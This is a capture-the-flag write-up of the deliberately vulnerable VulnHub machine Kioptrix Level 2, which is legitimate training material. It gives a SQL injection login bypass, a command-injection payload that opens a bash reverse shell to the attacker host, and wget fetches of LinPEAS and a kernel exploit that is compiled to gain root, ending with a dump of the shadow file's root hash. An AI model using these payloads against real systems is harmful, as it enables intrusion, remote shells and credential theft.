# Kioptrix Level 2 CTF Report (Kakaxh1)

**Target:** 192.168.1.34  
**Date:** March 24, 2026  
**Attacker:** 192.168.1.33  
**Platform:** VulnHub   
**Machine:** Kioptrix Level 2

---

## Phase 1: Reconnaissance

I performed an Nmap scan to identify open ports and services on the target.

**Command:**
```
nmap 192.168.1.34
```

**POC:**
```
┌──(kali㉿kali)-[~]
└─$ nmap 192.168.1.34                                   
Starting Nmap 7.98 at 2026-03-24 15:06 -0400
Nmap scan report for 192.168.1.34 (192.168.1.34)
Host is up (0.0023s latency).
Not shown: 993 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
111/tcp  open  rpcbind
443/tcp  open  https
631/tcp  open  ipp
666/tcp  open  doom
3306/tcp open  mysql
MAC Address: 00:0C:29:9C:FE:89 (VMware)
```

**Findings:** Open ports: 22 (SSH), 80 (HTTP), 111 (rpcbind), 443 (HTTPS), 631 (IPP), 666 (doom), 3306 (MySQL)

---

## Phase 2: Web Application Discovery

I accessed the web server on port 80.

**POC:**
```
┌──(kali㉿kali)-[~]
└─$ curl -I http://192.168.1.34
HTTP/1.1 200 OK
Server: Apache/2.0.52 (CentOS)
```

**Findings:** Apache 2.0.52 running on CentOS. Login page found at `/index.php`.

---

## Phase 3: SQL Injection Discovery

I tested the login form for SQL injection vulnerabilities using sqlmap.

**Command:**
```
sqlmap -u "http://192.168.1.34/index.php" \
--data="uname=admin&psw=test" \
--level=5 --risk=3 \
--string="Administator" \
--batch
```

**POC:**
```
┌──(kali㉿kali)-[~]
└─$ sqlmap -u "http://192.168.1.34/index.php" \
--data="uname=admin&psw=test" \
--level=5 --risk=3 \
--string="Administator" \
--batch

sqlmap identified the following injection point(s) with a total of 6054 HTTP(s) requests:
---
Parameter: uname (POST)
    Type: time-based blind
    Title: MySQL < 5.0.12 AND time-based blind (BENCHMARK)
    Payload: uname=admin' AND 7915=BENCHMARK(5000000,MD5(0x77617458))-- ybrB&psw=test
---

[INFO] retrieved: webapp
[*] database: webapp
[*] no tables found
```

**Findings:** SQL injection present on `uname` parameter (time-based blind). Database name `webapp` but no data found.

---

## Phase 4: Authentication Bypass

I manually bypassed the login using SQL injection.

**Payload:**
```
Username: admin' OR 1=1 --
Password: anything
```

**Result:** Successfully logged in as admin.

---

## Phase 5: Command Injection Discovery

After login, I found a ping functionality at `pingit.php` and tested for command injection.

**Findings:** Command injection confirmed. Running as user `apache` (uid=48).

---

## Phase 6: Remote Code Execution (RCE)

I exploited the command injection to get a reverse shell.

**Payload:**
```
1.1.1.1;bash -i >& /dev/tcp/192.168.1.33/4444 0>&1
```

**POC:**

**Kali Listener:**
```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.1.33] from (UNKNOWN) [192.168.1.34] 32769
bash: no job control in this shell
bash-3.00$ whoami
apache
bash-3.00$ id
uid=48(apache) gid=48(apache) groups=48(apache)
bash-3.00$ uname -a
Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 GNU/Linux
```

**Result:** Reverse shell obtained as user `apache` on CentOS 4.5 kernel 2.6.9.

---

## Phase 7: Privilege Escalation Enumeration

I uploaded and ran LinPEAS to find privilege escalation vectors.

**POC:**
```
bash-3.00$ wget http://192.168.1.33:8000/linpeas.sh
--13:02:46--  http://192.168.1.33:8000/linpeas.sh
           => `linpeas.sh'
Connecting to 192.168.1.33:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 282,418 [text/x-sh]
100%[====================================>] 282,418 --.--K/s
13:02:47 (10.12 MB/s) - `linpeas.sh' saved [282418/282418]

bash-3.00$ chmod +x linpeas.sh
bash-3.00$ ./linpeas.sh
```

**Findings:**
```
CVE: CVE-2009-2692 | Name: sock_sendpage | Kernel Range: 2.4.4-2.6.30
CVE: CVE-2010-3081 | Name: video4linux | Kernel Range: 2.6.0-2.6.33
CVE: CVE-2010-3437 | Name: pktcdvd | Kernel Range: 2.6.0-2.6.36
```

**Result:** Multiple kernel exploits available. `sock_sendpage` matches kernel 2.6.9.

---

## Phase 8: Privilege Escalation Exploitation

I transferred and compiled the `sock_sendpage` exploit.

**Transfer:**
```
bash-3.00$ wget http://192.168.1.33:8000/sock_sendpage.c -O exploit.c
--13:14:13--  http://192.168.1.33:8000/sock_sendpage.c
           => `exploit.c'
Connecting to 192.168.1.33:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3,378 (3.3K) [text/x-csrc]
100%[====================================>] 3,378 --.--K/s
13:14:13 (322.15 MB/s) - `exploit.c' saved [3378/3378]
```

**Compile:**
```
bash-3.00$ gcc -o exploit exploit.c
exploit.c:130:28: warning: no newline at end of file
```

**Execute:**
```
bash-3.00$ ./exploit
sh: no job control in this shell
sh-3.00# id
uid=0(root) gid=0(root) groups=48(apache)
sh-3.00# whoami
root
```

**Result:** Privilege escalation successful. Now root.

---

## Phase 9: Post-Exploitation

I confirmed root access and captured the root password hash.

**POC:**
```
sh-3.00# cat /etc/shadow | grep root
root:$1$FTpMLT88$VdzDQTTcksukSKMLRSVlc.:14529:0:99999:7:::
sh-3.00# hostname
kioptrix.level2
sh-3.00# uname -a
Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 GNU/Linux
```

**Root Hash Obtained:**
```
root:$1$FTpMLT88$VdzDQTTcksukSKMLRSVlc.:14529:0:99999:7:::
```
---

**Author:** Kakaxh1  
**GitHub:** https://github.com/Kakaxh1/  
**Date:** March 2026  
**Platform:** VulnHub - Kioptrix Level 2
